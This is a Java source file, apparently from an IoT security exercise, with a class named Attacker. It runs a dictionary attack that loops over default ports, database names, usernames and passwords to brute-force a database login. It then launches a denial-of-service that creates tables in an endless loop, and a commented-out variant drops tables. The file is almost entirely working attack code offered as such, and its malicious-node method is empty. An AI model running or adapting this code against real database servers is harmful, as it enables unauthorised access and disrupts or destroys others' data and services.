package iot;

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;
import java.sql.Statement;

public class Attacker {

	public static void main(String[] args) {
		initiateDOSAttack();
		intitiateMaliciousNodeAttack();
	}

	private static void intitiateMaliciousNodeAttack() {
		
	}

	/**
	 * In the DOS attack, the Database system is kept busy infinitely.
	 */
	private static void initiateDOSAttack() {
		/**
		 * Dictionary Attack
		 */
		System.out.println("Attempting connection to database (Dictionary attack)...");
		Connection conn = null;
		String url = null;
		try {
			Class.forName(AttackerRepo.DRIVER);
			/*
			 * We'll brute force all possibilities
			 */
			for(Integer port : AttackerRepo.DEFAULT_PORTS) {
				for(String dbName : AttackerRepo.DEFAULT_DB_NAMES) {
					url = AttackerRepo.HALF_URL + port + "/" + dbName;
					for(String username : AttackerRepo.DEFAULT_USERNAMES) {
						for(String password : AttackerRepo.DEFAULT_PASSWORDS) {
							try {
								/*
								 * Are these right connection credentials?
								 */
								conn = DriverManager.getConnection(url, username, password);
							} catch(SQLException e) {}
							if(conn != null) {
								break;
							}
						}
						if(conn != null) {
							break;
						}
					}
					if(conn != null) {
						break;
					}
				}
				if(conn != null) {
					break;
				}
			}
			if(conn != null) {
				System.out.println("Dictionary attack successfull!");
			}
			System.out.println("Running DoS attack...");
			/*
			 * Attacker simply creates random tables with random attributes
			 */
			String str = "a";
			long counter = 0;
			while(true) {
				String tableName = str + counter++;
				String query = "CREATE TABLE " + tableName + "("
						+ "ID Integer,"
						+ "Name varchar(25)"
						+ ");";
				Statement stmt = conn.createStatement();
				stmt.execute(query);
			}
//			while(true) {
//				String tableName = str + counter++;
//				String query = "drop table "+tableName+";";
//				Statement stmt = conn.createStatement();
//				stmt.execute(query);
//			}
		} catch(ClassNotFoundException e) {
			e.printStackTrace();
		} catch (SQLException e) {
			e.printStackTrace();
		}
	}
	
}
